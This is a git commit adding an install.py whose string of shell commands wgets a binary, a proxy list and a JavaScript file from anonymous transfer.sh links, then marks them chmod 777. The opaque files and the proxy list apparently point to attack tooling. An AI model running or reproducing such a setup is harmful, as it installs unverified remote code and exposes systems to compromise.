2ea42e0cba02cde22d3aacab39dad2f35e42eb63
bebrogramdd <121517481+bebrogramdd@users.noreply.github.com>
2023-01-08 14:31:51 +0300

    Add files via upload

---
+++ install.py
@@ -0,0 +1,7 @@
+import os
+
+commands = """wget https://transfer.sh/5fAx5V/mixedv8
+wget https://transfer.sh/RjaA7I/proxy.txt
+wget https://transfer.sh/AQ7byg/mixedv16.js
+chmod 777 mixedv8
+chmod 777 mixedv16.js"""
